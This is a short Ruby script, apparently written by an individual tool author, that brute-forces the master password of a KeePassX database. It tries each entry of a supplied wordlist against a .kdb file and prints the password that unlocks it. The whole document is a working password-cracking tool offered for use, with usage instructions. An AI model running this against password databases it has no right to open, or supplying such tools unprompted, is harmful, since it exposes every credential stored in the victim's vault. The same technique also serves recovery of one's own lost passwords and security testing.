#!/usr/bin/env ruby
#################################################
# simple Keepassx database brute force          #
# Coded by: KING SABRI                          #
# Requirements :                                #
# gem install keepassx                          #
#-----------------------------------------------#
# Note about gem installation:                  #
# if you got error during keepassx installation #
# make sure ruby-devel or ruby-dev is installed #
#################################################

require 'keepassx'


def keepassx(kdb , list)

		database = Keepassx::Database.open("#{kdb}")
	begin
		IO.readlines(list).each do |pass|
			password = pass.chomp
			
			begin 
							if database.unlock(password) == true
											return puts "\n[+] The Password is: #{password}\n\n"
											exit
							else
											puts " #{password}\t\t" + "[FAILED]"
							end

			rescue Exception => e
	puts e
				puts "Usage:"
				puts "ruby keePassX-brute-force.rb file.kdb password.list\n"
			end	# end of begin

		end	# end of IO
	end
end

begin 
		kdb, list = ARGV[0] , ARGV[1]
		keepassx(kdb , list)
rescue Exception => e
		puts e
		puts "Usage:"
		puts "ruby keePassX-brute-force.rb file.kdb password.list\n"
end       # end of begin